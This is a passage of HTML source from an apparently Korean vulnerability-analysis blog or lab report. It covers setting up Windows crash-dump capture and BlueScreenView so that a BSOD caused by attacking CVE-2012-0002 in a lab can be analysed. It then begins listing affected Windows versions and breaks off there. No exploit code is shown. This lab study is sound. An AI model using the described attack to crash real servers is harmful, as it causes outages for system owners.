코드는 알려지지 않았다.</p>\n<h1 id=\"bsod-메모리-덤프\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84\" aria-label=\"bsod 메모리 덤프 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프</h1>\n<h2 id=\"bsod-메모리-덤프-환경-설정\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\" aria-label=\"bsod 메모리 덤프 환경 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프 환경 설정</h2>\n<p><strong>1. 메모리 덤프 구성</strong></p>\n<p>BSOD 장애로 인한 메모리 덤프 저장을 하기 위해 설정을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACMklEQVQoz22QW2+aYBzG+Yj7Itt3aHa/ZFmWrUnrbLaLxrRrmtUzoBxeeTkJCkXwhFUQEKG0Tueh8i7OXexiz91z8cvz+/+xYok6uyi8+3T74Sz/MVMskiIQ71nxviF1YNPkFYtXLEHtylpfaveqEELFkLVed+QQDI8tlqvlcosQmjzYgCFFyEg8q0icZbQsQ03iOUIoTVP0NylC+2OdRxHmqIbXGr6E0fhhgBdvabJE10o0WYKAAFTF95zFcjMNEj9c+PNF+Lj6uUNMjTl5+wYHAEs363S7QS971xlxTLUpMrJAywLNN2o0WYqjsGP2c9f5YpUu4SxOwYao3lXI1yev3p99xQ4OfzTciQ2ossRTssBoCtQUKAByFnjDQe/0NJv5cnmeucxeXGWzOYqlxcHY82dYut8fr3EnNmQJCVKyQCsSq8gANmquM3adB56rCzzN87QosAJX11siQihJkgOcHt6AnInN1ssQHHgBUhqNq3hhFniB3Rd+XOlU1SSKJiDbLb6jN3+tt3EcH5cP8NQZ6SrX0YROmzc0Ua5X2Pz3MAzmfUs4/9y8/GZf5wb5m1azYWjyarWNo/if5bHNg5rIsRBQLEUAhuQAGYRB0DOb1zm9cDfmgEOUTZYwrTZK90nyiK3X691uhxDabNYzP5i6vutOXXfme9Hz81OKkNc31cKNjuf75TuzXlHrZb0tIYSenhIsmj9H0RL9PwejOAoHA9Me9YY9o9tgLFmwh90j/BtU7S1pPZgsXwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image18\"\n        title=\"image18\"\n        src=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png\"\n        srcset=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/e9ff0/image18.png 180w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/f21e7/image18.png 360w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 544px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA00lEQVQY02XKTWuEMBgE4PywmspSqNuv4/bS0lP/rbBFY2JMFGKyxNS+mgpa3VMPUljpwzCHYdDh+W1383gd3gU4WnMV3AY4wuE+wNHL6/vD0wGH+3B3/z/ImJMxJ63N8fhBCKGUxnGcZRljjBDi3CdA9/UHtlDbtgDQNI0QgnOulBJCSCm01tZaADifl3n+WZZ5mqZxC1lrnXPGmDRNi6KQUhJC8jwvy7Kua6XU2lVVWWuHYfi+gADAe991HaVUCJEkCeecMdb3/bqvP+/9OI7L1i/7U+lbJIl2bAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1\"\n        title=\"image 4 1\"\n        src=\"/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png\"\n        srcset=\"/static/d5411968270e22024f0986d60ab7df63/e9ff0/image-4.1.png 180w,\n/static/d5411968270e22024f0986d60ab7df63/f21e7/image-4.1.png 360w,\n/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png 544w\"\n        sizes=\"(max-width: 544px) 100vw, 544px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 메모리 덤프를 위한 디스크 할당</strong></p>\n<p>기존에 사용하던 디스크 대신 사후에 메모리 덤프 분석이 끝난 후 폐기를 할\n수 있도록 가상 하드 디스크를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC9UlEQVQ4y2VT227bRhBdGOhfFXD74AD9pP5QH4rGSCIhRRMbQRwgdRFbqSVHkiVKvIhL7iyXe+GSEiWbMwWF9qU+wHlazNkzM2dYUZZUqJK2zZaapsHD4YBPT0/U7vdDnmW1sZYOh0fsELHrOuoQXbPbDeLNhpRS3Xa7xf1+T33N4+MjsfhuTIZzqpuGkiTBoijQ1zU5gOF6PK5XkwllQYAQhijWIakwcmq5HGwm91Qq1Vlrsaoq6umcIza7m5A3hnoYY1Brjb0rm+fD4Ovf9fTmltaTewzuxhhNpySDwEEYDqLlkjKedQCAEmTvtq8nNntYYl032KP/rRe1zpL1fjCdzf1o9JVmsznGcYIAQKXWVnv/pig1qaLo+o6klFgqhc5aZG3bEiIe6XrbdU2Q56ST5I9CiFYIICklqbKk3nkchk0RRm8rY8g61znnsPIeXVVhkmyOguawP5i6rg1wboso8mI6q+zl5dBznjvvK61LI7LM8lW8zWfz1H34cGHTlIxzVJaK8pRTFsaUcU4sy7JzAXDu2/alBnhVRdF7p9RA7XY/8zz/xWj9qm3blyqH19ksuCiVOi+77ifTNN9X1v7ARX56+/7j6Zdfh6frxcMpEwCUJxuqAeiw31NHRH08tk3z+4bzVkhJxjqqt9vj22PX0a6uf/S7HdOFYlzkbHR5xW5+e8vCxYKx5WqN64cFptMpJlF0HHC/MUjTQXQ39mKxJAiCrgyjTkdxJ+ZzKtP0RRkETAN8JwBOvl3fnEzeXZ2EQXDCJje3+OXPa5zef8PlYolhGGKapiSzbGhyUVuQ5KBACxJ1LlBzThrgzAjBtBAn7P94uP6LJlefKBiN+lwhCIEAkqT3b4z3vt+scRZ7WuewNIZAFmdCSlYo9VxQFgWBlP8RTdNg2Lf5+fOF32wa5z31+fr3Io7u1+vwbD5/YHGcPBfs56W1PuaMRxEmFx8xG9+TmEzeiSBocgDinONqvsD59S2GqxUlPD1LeMriOH4m+A+hZ2EwIHbVVQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image19\"\n        title=\"image19\"\n        src=\"/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png\"\n        srcset=\"/static/63669029ee12f6255b1201df09d7b599/e9ff0/image19.png 180w,\n/static/63669029ee12f6255b1201df09d7b599/f21e7/image19.png 360w,\n/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABQElEQVQoz33RW0+DMBgGYP6VE+chOg8x0Tt36U8eyZYFMlpogcq5pVsppYCasUuHT97bN3nzfcbb+3JmLubXz+b8cWYuxjxcmouL2f3t3evH8vNq/jS/eTkboyjKsqQIIdd1LctarSyMMSFfGAcQerudm2aZlI0Q9d8YdS2krLMswxhDCBFClFLOedM036NhGPq+OxuDc77f7wkhvu8DAFzXjeOYMSalHIZBa62Uaiccy4fD4VTebDYAgCRJsixDCPm+XxRF27ZqglFVFeccIQQA2G63tm2XZckYO40XQqhpRj0KwzCKoiAICCFxHHuelyRJ27Za636aIaXUWqdpSghxHAchJISglOZ5Tintuu5n2nE2YywMQ8/zIISO40RRVFXV6VRN08hphhBCShkEAYTQtu31ep3nuVJq/FA//OsXjZYLG1io1dEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 2\"\n        title=\"image 4 1 2\"\n        src=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png\"\n        srcset=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/e9ff0/image-4.1.2.png 180w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/f21e7/image-4.1.2.png 360w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 디스크 구성</strong></p>\n<p>가상 디스크를 할당한후 운영체제 환경에 디스크를 할당한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADD0lEQVQoz2WSPWwbZRzGX8PEwIrEZHYYMnRORNkqJD4nhCJBkRBj1QxdGAFB6AIiQNTaTZOKKk2gzZd7aeyzz3f33p3v673znS9xHNM29tlJbCfko019lwe5a57pmX7Po///IRe+voYfUvPICiZEPYj9ehvt3rEnKq5ckBgUsxrp7r9w1rejeniAJ62eXFQcLy87kPT12PAeg21so9bood7YASHvf4qbGQ6nhwfo7O3Gz0+OAcCr+obsmBICtxRVKyaqFSParJgIyrq86Wqer+Thq4W46mqoMRWbvgnf0UDIh6PxDC/FAOIX/Sg6GxjANQxJLPIcdLXQN4RczIq5vmNRWLYimlrRpWvLEFeXopLMxzYtxI4px4YmxIR8/BXuiPqgFV7CzoBnYasW0Lzl2grKtgLXpCjbKsoWhbbywKoo+ZrDFAwCXIuizFR4TIWtiyBjN9Jh0SyFB51mGG6tNxuB23kqC1KVz3Auoz2fKY2yTUMmrjVYgetZC3OrAf/QdJh6VLZoh5m0a+S5riU86mo03yUrs9mR67/Mjlz7aWbkux+nhn/9ff7ddF6/8NeiNLS6JF/87cbC8PcT8yM/X58ankzdvzgtGkPqlvMmK4lvMUNKqqqQXEtNJgsz6SSfyySJalbCSq0RBlvN8Gl7v7mzf9Jt7/UK7135dumdy1f2/7iXaRh2EJpebftJe/9gt3e0DIBQfpk4hkQ0TSDZ9CQp3LlF+FyGEEbzsOUcXE2AZ9GXt6g4pY03Pv9CI5c+wXRmFd1WiG63g2cnxzg+OtTHx8dfRdRNrPvsFaMkJop/303QhbmEKDxKEMotxgq3EAdrXFyXi5GrFmDbivvaZ5cl8tEoJuYe9Dc8L/7v8LB/evoce7s78sSf04nb03dJs9kg56TnOdDMfZSFLOquGfuDT/Kc//roNwr54EvcE7UIL07RPzuLBktot9o0fWsisbI4R1qt1nkg0yXYWhFGqQiVfxhr2RWwf2Y3plIpY+zmFDRmx3vtbdTLLHrsOahUXHrp7aHE1atjxNTVc8D/AYGhe/WlD7MGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image20\"\n        title=\"image20\"\n        src=\"/static/cedba1779661dda16537c68730284b83/32056/image20.png\"\n        srcset=\"/static/cedba1779661dda16537c68730284b83/e9ff0/image20.png 180w,\n/static/cedba1779661dda16537c68730284b83/f21e7/image20.png 360w,\n/static/cedba1779661dda16537c68730284b83/32056/image20.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABK0lEQVQoz43QQU/CMBgG4P41sznRRJmiFw+ejEf/KOGCGOpgjDUD2jHXjkL7FbbVCIleYPrkvX55836o8/DkuO1zz3fc9plz7Xp+6+r+4rLjer5/+/j88uq17o7GcW9QkiSUsn7/bTB47/V6GH8wxiilnPPPvfwYznkcEySlVEqNx+PZbJYkyWKxEEJIKa21ZVlWJ9R1LYRAnPOiKEajURAEw+FwOp0yxubzuVIKTjPGLJfL72YAIHuTyYRSCgCbzaah9rdZCJHneRiGURRhjMMwLIpCa60aaa0ZY0hrDQBxHFNKGWNZlhFCjDH2L6vVCq3Xa2NMEASEkHhPCFHX9b+OlVJSyp/NaZpaa3e7XdmoqirOOcqy7PBtjHG3242iaLvdHlY1AIA0Tb8AS48QmgE1xt8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 3\"\n        title=\"image 4 1 3\"\n        src=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png\"\n        srcset=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/e9ff0/image-4.1.3.png 180w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/f21e7/image-4.1.3.png 360w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>4. BlueScreenView 설치</p>\n<p>BSOD 장애가 발생할 환경에서 BSOD 덤프정보를 확인할 수 있는 프로그램 설치</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADeElEQVQ4y3WR3WsjZRTGX4io4M2CLHi36r2sIPhPiP+A7CJavNF10XrhdgVRXHFhi25BVLYtajsW624/rG2apE2bZCbp5HNmkmkySdqmaZppMtOkadKmzUze95GJglce+PGcc+AcHs4h60oNYr6FpNZCVG0gojQRVo4hSCZ4ybQdDUm1yWhMKGuyiLQYYAnehyTvRTq6CSURgpYWLUeVRGiUuFNdbEQN+Dd2sOY/xIpnHx5fBQHeQFCo25t8HSm5PXls6uWDyiFsy2KVfAal7QzqlTJMowajfmTtFPPIZdVRMhdqUblg0KahU7Neo6ah01azQXO5bcqHwz01q+JQP5honTZL+tERej2rzyyLMsumYKDAgEv8Ew/I0mYbSbWDevkUnc6ZMwDLtlHQ0gisLUPc8ECKC9On5+eGaZr4/2Dods/HyHLwmBNjbe5Q63Dt9gnXOmly7dMWJyXj3Nrq8lQk5JtLRfn3Ikp5TJSKs+Vqazq/Z3IVo8MdGmecbp5z9cbFr/rx2aK2e/QW2cnK8p6myka9KheLRVnNZORKZV+u1XT5oFxONhvGjn6kf/Fw9KfVh19/n/3m3g/S2IMJefzHKfnRoxl5/JfH8uTUXOLn3xZK07N/DRO/L4alRQFur4Qn7iQW5tex8McyZn/3YNGTgN3vo9u9nF738YYU20I6KSIeFsD7NpAIxxAVU5BSKqJbSaiK9h2xLJv2KaUAGxy4qG3TpcczNJ2KU0r7PQYGu9ef8K8GS17vOvxrm333io8GAjwNBQUaDIRomI/0w0IEwkagSgDYDpTSgVYrJTvoX7HzWcVmjP37PTYeD8f20+kMMorMRDGKtKIgl81CliVouaxTMyUeB2GMYYBjEkClvIctfg3FfGbQd8ybhjGTy2T1nnWBi26bNRoGLKsLxix0u23YVpddXHbQrFWp43CIMTZEKR1y8t2iNuRzzw/tFbNO/92eZX9wdmK8lhJzc2KkgIiQ70eEPCLhPLbCefAhDXxQQzCYQ8AnDxwOoHSwnJR2C8Tnnie7BXVQO7x58wl54eq9+1eu3sczz31lPfXslyDkcxDyGQi5C0JG/lMALsaYi1LqcvL9vaLL7/3TtVtQXf1LyzUzuvr0G8/fJp++fvfbW9dHcOv6HevDV0fw/it38PbLn+DGtY9x88Vh3Lg2jHde+gh/A5uZS2EXS8U3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image21\"\n        title=\"image21\"\n        src=\"/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png\"\n        srcset=\"/static/1b408504f5c7864ab444c3a8f930d978/e9ff0/image21.png 180w,\n/static/1b408504f5c7864ab444c3a8f930d978/f21e7/image21.png 360w,\n/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/UlEQVQY043N3U6DMAAF4L6fyoCpA3RmJhKv9q5LyFYgkKWAKb8FWls6JMwEonEXRr+cy3NygG1vnzavy7u1plva8kHTLVUzVd1SVENZGC/29nFtX13f3iirhWbeG5uV+fwdIITo+34YhqIo8jzPJnmelWWBMU6SpK5rIQRjTEo5juP5BxDH8TyAEO73e8dxIIRZlhFCMMZpmhJC3ieMsfYSQAjNh4fDAULouq7neVEU+b5/PB6DIGjbllI6t+kl0DQN55xSmiRJGIaMsdPpxDmXUvZ9L6X8+B2o67rrOiHE2xff9xFC538AGGNCSFmWcLLb7RBCVVUJIfhfPgFbsmVSc6QrLQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 4\"\n        title=\"image 4 1 4\"\n        src=\"/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png\"\n        srcset=\"/static/78528d128c548111bde3239c2ef2b5a4/e9ff0/image-4.1.4.png 180w,\n/static/78528d128c548111bde3239c2ef2b5a4/f21e7/image-4.1.4.png 360w,\n/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>BSOD 메모리 덤프 분석을 하기위한 환경 설정 과정을 마쳤다. 5.7.2 Windbg\n동적 분석 장에서 분석하기 위해 사용될 것이기 때문에 환경 구성 한다. 현재\n과정에서 CVE-2012-0002 취약점을 통한 공격을 수행한후 대상 서버에서 BSOD\n장애가 발생하면 해당 메모리 덤프가 저장되어 분석을 할 수 있다.</p>\n<h1 id=\"cve-2012-0002-분석\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%B6%84%EC%84%9D\" aria-label=\"cve 2012 0002 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 분석</h1>\n<h2 id=\"cve-2012-0002-취약점-개요\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\" aria-label=\"cve 2012 0002 취약점 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 개요</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 545px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+0lEQVQI1x3OS0rDQBgA4FxGBEFqbS0uUqubtrpQ7EaL1AZfVPAIuvEyunChC6EgBS+QTXYZmJnMpDSPSRpSTJwxgV/a7wSfVqnq7c5pbWd/aIwiITjnrutSQhBCnHPGmGmalmVhjBljlFLHcRhjnHPf97VKVW+2juqNg0tjBABSSvW3VBSFUkoIgTEmhCwWaVmWSqliRa1o9Ubr7NzoHPYGw7s8y6L5PPa8GOMojrPsZzz+ur59eHx6vhjcTCbfeZ4TQhFCQRAkSaJtbTePT/r6Xte4ugeAXym92SyYTsMwBID3j8+Nzd12t7e2Xnt5fQMASqlt22m6jPwDZouw7C0u+5oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 1\"\n        title=\"image 5 1\"\n        src=\"/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png\"\n        srcset=\"/static/e490a63b7d51a6c296da3986913c33a6/e9ff0/image-5.1.png 180w,\n/static/e490a63b7d51a6c296da3986913c33a6/f21e7/image-5.1.png 360w,\n/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png 545w\"\n        sizes=\"(max-width: 545px) 100vw, 545px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"cve-2012-0002-대상-시스템-목록\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\" aria-label=\"cve 2012 0002 대상 시스템 목록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 대상 시스템 목록</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> window XP              <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Vista Ultimate  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2003</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window <span class=\"token number\">7</span>               <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2008</span><span class=\"token punctuation\">,</span> R2 <span class=\"token 